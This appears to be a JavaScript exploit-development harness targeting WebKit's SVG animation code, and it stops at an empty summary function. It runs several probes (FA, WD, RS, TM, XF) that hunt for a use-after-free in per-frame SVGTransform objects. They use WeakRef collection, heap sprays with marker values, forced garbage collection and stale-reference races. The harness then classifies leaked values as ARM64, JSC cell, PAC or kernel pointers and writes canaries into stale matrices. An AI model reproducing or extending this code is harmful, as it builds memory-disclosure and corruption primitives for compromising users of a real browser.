<script>
var NS='http://www.w3.org/2000/svg';

var _fb=new ArrayBuffer(8);
var _dv=new Float64Array(_fb);
var _uv=new Uint32Array(_fb);
function f64hex(f){
  if(f===null||f===undefined)return'null';
  if(typeof f==='string')return f;
  _dv[0]=f;
  return'0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0');
}
function fromHiLo(hi,lo){_uv[1]=hi>>>0;_uv[0]=lo>>>0;return _dv[0];}

function classifyPtr(v){
  if(v===null||v===undefined||isNaN(v)||!isFinite(v))return null;
  _dv[0]=v; var hi=_uv[1]; var lo=_uv[0];
  if(hi===0x00000001)return{type:'arm64_user',hi:hi,lo:lo};
  if(hi>=0x00000002&&hi<=0x0000ffff&&lo>0x1000)return{type:'native_heap',hi:hi,lo:lo};
  if(hi>=0x00010000&&hi<=0x0001ffff)return{type:'jsc_cell',hi:hi,lo:lo};
  if(hi>=0x00100000&&hi<=0x001fffff)return{type:'pac_ptr',hi:hi,lo:lo};
  if(hi>=0xffff0000)return{type:'kernel',hi:hi,lo:lo};
  return null;
}
function isWeird(v){
  if(v===null||v===undefined||isNaN(v)||!isFinite(v))return false;
  if(v===0||v===1||v===-1)return false;
  _dv[0]=v; var hi=_uv[1];
  if(hi>=0x3f000000&&hi<=0x43200000)return false;
  return true;
}

function log(m,c){
  var d=document.getElementById('out');
  var e=document.createElement('div');
  e.className='result '+(c||'pink');
  e.textContent=m;
  d.appendChild(e);
  e.scrollIntoView({block:'nearest'});
}
function R(m){log(m,'red');}  // holy shit
function B(m){log(m,'blue');} // alright
function P(m){log(m,'pink');} // useless
function prog(m){document.getElementById('progress').textContent=m;}
function hdr(m){log(m,'hdr');}
function clearOut(){document.getElementById('out').innerHTML='';prog('');}
function copyAll(){
  var lines=[];
  document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
  navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
}

function mkSVG(w,h){
  var s=document.createElementNS(NS,'svg');
  s.setAttribute('width',w||200);s.setAttribute('height',h||200);
  s.style.cssText='position:fixed;left:0;top:0;width:'+(w||200)+'px;height:'+(h||200)+'px;opacity:0.001;pointer-events:none';
  document.body.appendChild(s);return s;
}
function mkEl(p,tag,attrs){
  var e=document.createElementNS(NS,tag);
  if(attrs)Object.keys(attrs).forEach(function(k){e.setAttribute(k,attrs[k]);});
  p.appendChild(e);return e;
}

// ════════════════════════════════════════════════════════════════════════
// FA — Frame Alloc UAF
// v37 CONFIRMED: animVal.getItem(0) returns NEW SVGTransform each frame
// that means every old frame ref is a potential dangling ref
// the C++ SVGTransform object allocated for frame N is released when
// frame N+1 is computed — the JS wrapper is the last ref
// STRATEGY: collect 60 frame refs WITHOUT holding strong refs in an array
//   → let old frame objects be GC'd
//   → spray into the freed slots
//   → read old WeakRef frame refs
// ════════════════════════════════════════════════════════════════════════
function runFA(){
  hdr('FA: per-frame SVGTransform UAF via WeakRef spray');
  var svg=mkSVG(200,200);
  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'red'});
  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
  mkEl(r,'animateTransform',{
    attributeName:'transform',type:'translate',
    from:'0 0',to:'200 0',dur:'0.3s',repeatCount:'indefinite'
  });

  B('FA: confirmed new SVGTransform per frame from v37 — now probing for UAF');

  // FA[1]: collect WeakRefs to per-frame SVGTransform objects
  hdr('FA[1]: WeakRef per-frame collection');
  var frameWeakRefs=[];
  var frameValsAtCapture=[];
  var sprayVal=fromHiLo(0xDEADC0DE,0xFEEDFACE);
  var frameCount=0;
  var startT=performance.now();
  var sprayWave=null;

  function collectFrame(){
    var elapsed=performance.now()-startT;

    if(elapsed<500){
      // phase 1: collect WeakRefs only (no strong refs kept)
      try{
        var avList=r.transform.animVal;
        if(avList.numberOfItems>0){
          var tx=avList.getItem(0);
          frameWeakRefs.push(new WeakRef(tx));
          frameValsAtCapture.push(tx.matrix.e);
          frameCount++;
          // tx goes out of scope — only WeakRef holds it
          tx=null;
        }
      }catch(e){}
      requestAnimationFrame(collectFrame);
      return;
    }

    if(elapsed>=500&&elapsed<600){
      // phase 2: spray 1000 SVGTransforms into freed slots
      if(!sprayWave){
        sprayWave=[];
        for(var i=0;i<1000;i++){
          var st=svg.createSVGTransform();
          st.matrix.e=sprayVal;
          st.matrix.f=sprayVal;
          st.matrix.a=sprayVal;
          sprayWave.push(st);
        }
        // also apply GC pressure
        var p=[];for(var i=0;i<2000;i++)p.push(new Float64Array(512));p=null;
        B('FA[1]: collected '+frameCount+' WeakRef frames, spray wave created');
      }
      requestAnimationFrame(collectFrame);
      return;
    }

    // phase 3: read all WeakRefs
    hdr('FA[2]: reading all WeakRef frame refs after spray');
    var alive=0, dead=0, changed=0, ptrs=0;
    var results=[];

    frameWeakRefs.forEach(function(wr,i){
      var deref=wr.deref();
      if(!deref){dead++;return;}
      alive++;
      var nowE=null;
      try{nowE=deref.matrix.e;}catch(e){nowE='THROWS';}
      var captureE=frameValsAtCapture[i];
      if(typeof nowE==='number'&&nowE!==captureE){
        changed++;
        var p=classifyPtr(nowE);
        if(p){
          ptrs++;
          results.push({i:i,capture:captureE,now:nowE,ptr:p});
        } else if(nowE===sprayVal){
          results.push({i:i,capture:captureE,now:nowE,spray:true});
        } else {
          results.push({i:i,capture:captureE,now:nowE,weird:true});
        }
      }
    });

    B('FA[2]: total='+frameWeakRefs.length+' alive='+alive+' dead='+dead+
      ' changed='+changed+' ptrs='+ptrs);

    results.forEach(function(res){
      if(res.ptr){
        R('FA[2]: frame['+res.i+'] POINTER! capture='+f64hex(res.capture)+
          ' now='+f64hex(res.now)+' type='+res.ptr.type);
      } else if(res.spray){
        R('FA[2]: frame['+res.i+'] SPRAY VALUE! capture='+f64hex(res.capture)+
          ' now='+f64hex(res.now)+' — UAF CONFIRMED!');
      } else if(res.weird){
        B('FA[2]: frame['+res.i+'] CHANGED: capture='+f64hex(res.capture)+
          ' now='+f64hex(res.now));
      }
    });

    if(changed===0){
      P('FA[2]: 0 refs changed — WeakRefs keeping objects alive via JS GC');
      B('FA: note — WebKit JSC may not GC WeakRef targets synchronously');
    }

    svg.remove();
    prog('FA done');
  }

  setTimeout(function(){requestAnimationFrame(collectFrame);},50);
}

// ════════════════════════════════════════════════════════════════════════
// WD — WeakRef deref window: probe the EXACT moment between
// C++ object free and JS GC sweep
// if ARC drops the C++ SVGTransform but JSC GC hasn't swept yet,
// the WeakRef is still alive but the C++ backing is freed
// reads in that window could give raw heap data
// ════════════════════════════════════════════════════════════════════════
function runWD(){
  hdr('WD: WeakRef deref timing window probe');
  var svg=mkSVG(200,200);

  // WD[1]: rapid WeakRef creation + deref under GC pressure
  hdr('WD[1]: rapid WeakRef cycle — looking for deref-after-free window');
  var hitCount=0;
  var totalRounds=200;

  for(var round=0;round<totalRounds;round++){
    var wr=null;
    var captureE=null;
    (function(){
      var mx=svg.createSVGMatrix();
      mx.e=fromHiLo(0xAAAA0000+round,0xBBBB0000+round);
      captureE=mx.e;
      wr=new WeakRef(mx);
      // mx drops here
    })();

    // immediate GC pressure
    var p=[];for(var i=0;i<100;i++)p.push(new Float64Array(64));p=null;

    // deref immediately
    var deref=wr.deref();
    if(deref){
      var nowE=null;
      try{nowE=deref.e;}catch(e){nowE='THROWS';}
      if(typeof nowE==='number'&&nowE!==captureE){
        hitCount++;
        var ptr=classifyPtr(nowE);
        R('WD[1]: round '+round+': deref alive but e changed! capture='+
          f64hex(captureE)+' now='+f64hex(nowE)+(ptr?' TYPE='+ptr.type:''));
      }
    }
  }

  if(hitCount===0){
    P('WD[1]: 0/'+totalRounds+' rounds showed changed value in deref');
  } else {
    R('WD[1]: '+hitCount+'/'+totalRounds+' rounds had value changes in live deref!');
  }

  // WD[2]: SVGTransform version
  hdr('WD[2]: SVGTransform WeakRef rapid cycle');
  var txHits=0;
  for(var round=0;round<200;round++){
    var txWR=null;
    var txCapture=null;
    (function(){
      var tx=svg.createSVGTransform();
      tx.matrix.e=fromHiLo(0xDEAD0000+round,0xFEED0000+round);
      txCapture=tx.matrix.e;
      txWR=new WeakRef(tx);
    })();
    var p2=[];for(var i=0;i<100;i++)p2.push(new Float64Array(64));p2=null;
    var d=txWR.deref();
    if(d){
      var v=null;try{v=d.matrix.e;}catch(e){v='THROWS';}
      if(typeof v==='number'&&v!==txCapture){
        txHits++;
        R('WD[2]: SVGTransform round '+round+' changed: '+f64hex(txCapture)+' → '+f64hex(v));
      }
    }
  }
  if(txHits===0)P('WD[2]: 0/200 SVGTransform rounds changed');
  else R('WD[2]: '+txHits+' SVGTransform deref changes!');

  svg.remove();
  prog('WD done');
}

// ════════════════════════════════════════════════════════════════════════
// RS — racing stop/start animation to get stale animVal refs
// stop animation while holding animVal ref
// restart with different values
// do old refs show new animation state or stale?
// ════════════════════════════════════════════════════════════════════════
function runRS(){
  hdr('RS: animation stop/restart race — stale animVal ref probe');
  var svg=mkSVG(200,200);
  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'blue'});
  r.setAttribute('transform','matrix(1 0 0 1 0 0)');

  var anim=mkEl(r,'animateTransform',{
    attributeName:'transform',type:'translate',
    from:'0 0',to:'100 0',dur:'2s',repeatCount:'indefinite'
  });

  // RS[1]: capture animVal ref mid-animation, stop, restart with different target
  hdr('RS[1]: capture ref → stop → restart race');
  setTimeout(function(){
    // capture mid-animation
    var savedRef=null;
    var savedVal=null;
    try{
      var avList=r.transform.animVal;
      if(avList.numberOfItems>0){
        savedRef=avList.getItem(0);
        savedVal=savedRef.matrix.e;
      }
    }catch(e){}

    B('RS[1]: captured ref at e='+f64hex(savedVal));

    // stop animation
    try{anim.setAttribute('dur','0.001s');}catch(e){}
    // change animation to wildly different values
    try{
      anim.setAttribute('from','9999 9999');
      anim.setAttribute('to','8888 8888');
      anim.setAttribute('dur','3s');
    }catch(e){}

    // read saved ref after animation change
    setTimeout(function(){
      var afterChange=null;
      try{afterChange=savedRef.matrix.e;}catch(e){afterChange='THROWS';}
      B('RS[1]: ref value after anim change: before='+f64hex(savedVal)+' after='+f64hex(afterChange));

      var ptr=classifyPtr(typeof afterChange==='number'?afterChange:null);
      if(ptr){
        R('RS[1]: POINTER IN STALE ANIM REF! type='+ptr.type+' val='+f64hex(afterChange));
      } else if(typeof afterChange==='number'&&isWeird(afterChange)){
        B('RS[1]: weird value after anim restart: '+f64hex(afterChange));
      } else {
        P('RS[1]: ref tracks new animation value (same backing object)');
      }

      // RS[2]: check if the ref now points to new animation or is stale
      hdr('RS[2]: is saved ref same object as new animVal?');
      var newRef=null;
      try{newRef=r.transform.animVal.getItem(0);}catch(e){}
      if(newRef&&savedRef){
        B('RS[2]: saved===new: '+(savedRef===newRef));
        if(savedRef!==newRef){
          B('RS[2]: DIFFERENT OBJECTS after restart — old ref may be stale!');
          var staleE=null;
          try{staleE=savedRef.matrix.e;}catch(e){staleE='THROWS';}
          var newE=null;
          try{newE=newRef.matrix.e;}catch(e){newE='THROWS';}
          B('RS[2]: stale.e='+f64hex(staleE)+' new.e='+f64hex(newE));
          var p=classifyPtr(typeof staleE==='number'?staleE:null);
          if(p)R('RS[2]: POINTER IN STALE RESTART REF! type='+p.type);
        }
      }

      anim.remove();
      svg.remove();
      prog('RS done');
    },300);
  },300);
}

// ════════════════════════════════════════════════════════════════════════
// TM — timing attack: read animVal during SVG layout recalc
// force a layout recalc (offsetWidth touch) while reading animVal
// race between layout engine updating animated values and our JS read
// ════════════════════════════════════════════════════════════════════════
function runTM(){
  hdr('TM: layout recalc race — read during internal state update');
  var svg=mkSVG(200,200);
  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'green'});
  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
  mkEl(r,'animateTransform',{
    attributeName:'transform',type:'translate',
    from:'0 0',to:'200 0',dur:'0.1s',repeatCount:'indefinite'
  });

  // TM[1]: rapid interleave layout-force with animVal read
  hdr('TM[1]: interleave forced layout with animVal read');
  var weirdCount=0;
  var ptrCount=0;
  var totalSamples=0;

  var tmStart=performance.now();
  function tmFrame(){
    var elapsed=performance.now()-tmStart;
    if(elapsed>2000){
      B('TM[1]: '+totalSamples+' samples, '+weirdCount+' weird, '+ptrCount+' ptrs');
      if(ptrCount>0)R('TM[1]: POINTER DURING LAYOUT RACE!');
      else if(weirdCount>0)B('TM[1]: weird values during layout race');
      else P('TM[1]: no weird values during layout race');
      svg.remove();
      prog('TM done');
      return;
    }

    // force layout (triggers synchronous layout recalc)
    void svg.getBoundingClientRect();

    // immediately read animVal
    try{
      var avList=r.transform.animVal;
      if(avList.numberOfItems>0){
        var tx=avList.getItem(0);
        ['a','b','c','d','e','f'].forEach(function(f){
          var v=tx.matrix[f];
          totalSamples++;
          var ptr=classifyPtr(v);
          if(ptr){
            ptrCount++;
            R('TM[1]: POINTER in matrix.'+f+'='+f64hex(v)+' type='+ptr.type);
          } else if(isWeird(v)){
            weirdCount++;
            B('TM[1]: weird matrix.'+f+'='+f64hex(v));
          }
        });
      }
    }catch(e){}

    requestAnimationFrame(tmFrame);
  }
  setTimeout(function(){requestAnimationFrame(tmFrame);},50);
}

// ════════════════════════════════════════════════════════════════════════
// XF — cross-frame matrix accumulation attack
// per-frame SVGTransform objects — if we can get refs to N consecutive
// frames and their MATRIX OBJECTS, we can probe whether the matrix
// backing is shared across frames or freshly allocated
// if fresh: freed after each frame → spam spray between frames
// ════════════════════════════════════════════════════════════════════════
function runXF(){
  hdr('XF: cross-frame matrix backing probe');
  var svg=mkSVG(200,200);
  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'purple'});
  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
  mkEl(r,'animateTransform',{
    attributeName:'transform',type:'translate',
    from:'0 0',to:'100 0',dur:'1s',repeatCount:'indefinite'
  });

  // XF[1]: collect consecutive frame SVGTransform AND their SVGMatrix objects
  hdr('XF[1]: per-frame matrix object identity — are matrices shared?');
  var frameTXs=[];  // strong refs to SVGTransform objects
  var frameMXs=[];  // strong refs to SVGMatrix objects from each tx
  var frameEs=[];
  var xfStart=performance.now();

  function xfCollect(){
    var elapsed=performance.now()-xfStart;
    if(elapsed>500){
      // analyze
      hdr('XF[1]: analysis — '+frameTXs.length+' frames collected');

      // check tx identity
      var txAllSame=frameTXs.every(function(tx){return tx===frameTXs[0];});
      B('XF[1]: all SVGTransform objects same='+txAllSame+' ('+frameTXs.length+' frames)');

      // check matrix identity
      var mxAllSame=frameMXs.every(function(mx){return mx===frameMXs[0];});
      B('XF[1]: all SVGMatrix objects same='+mxAllSame);

      if(!mxAllSame){
        B('XF[1]: DIFFERENT MATRIX OBJECTS PER FRAME — fresh allocation each frame!');
        // how many are unique?
        var uniqueMX=new Set(frameMXs);
        B('XF[1]: unique matrix objects: '+uniqueMX.size+' out of '+frameMXs.length);
      }

      // XF[2]: read all saved matrix objects NOW — are old frames stale?
      hdr('XF[2]: read all saved matrix refs after animation advanced');
      var changedCount=0, ptrCount=0;
      frameMXs.forEach(function(mx,i){
        var nowE=null;
        try{nowE=mx.e;}catch(e){nowE='THROWS';}
        if(typeof nowE==='number'&&nowE!==frameEs[i]){
          changedCount++;
          var p=classifyPtr(nowE);
          if(p){
            ptrCount++;
            R('XF[2]: frame['+i+'] matrix POINTER! was='+f64hex(frameEs[i])+' now='+f64hex(nowE)+' type='+p.type);
          } else {
            B('XF[2]: frame['+i+'] matrix changed: was='+f64hex(frameEs[i])+' now='+f64hex(nowE));
          }
        }
      });
      B('XF[2]: '+changedCount+'/'+frameMXs.length+' matrix refs changed, '+ptrCount+' ptrs');
      if(changedCount===0)P('XF[2]: all matrix refs stable (same backing, in-place update)');

      // XF[3]: write canary to old frame matrix, check if current animVal shows it
      hdr('XF[3]: write canary to old frame matrix → does current animVal show it?');
      if(frameMXs.length>1){
        var oldMX=frameMXs[0];
        var canary=fromHiLo(0xDEADBEEF,0xCAFEBABE);
        try{oldMX.e=canary;}catch(e){P('XF[3]: write to old mx threw: '+e);return;}
        // read current animVal
        var curE=null;
        try{curE=r.transform.animVal.getItem(0).matrix.e;}catch(e){}
        B('XF[3]: wrote canary to old frame matrix — current animVal.e='+f64hex(curE)+
          ' (canary match='+(curE===canary)+')');
        if(curE===canary)R('XF[3]: CANARY VISIBLE IN CURRENT ANIMVAL! Old frame matrix IS current backing!');
      }

      svg.remove();
      prog('XF done');
      return;
    }

    // collect this frame
    try{
      var avList=r.transform.animVal;
      if(avList.numberOfItems>0){
        var tx=avList.getItem(0);
        var mx=tx.matrix;
        frameTXs.push(tx);
        frameMXs.push(mx);
        frameEs.push(mx.e);
      }
    }catch(e){}
    requestAnimationFrame(xfCollect);
  }
  setTimeout(function(){requestAnimationFrame(xfCollect);},50);
}

// ════════════════════════════════════════════════════════════════════════
// SU — summary
// ════════════════════════════════════════════════════════════════════════
function runSU(){
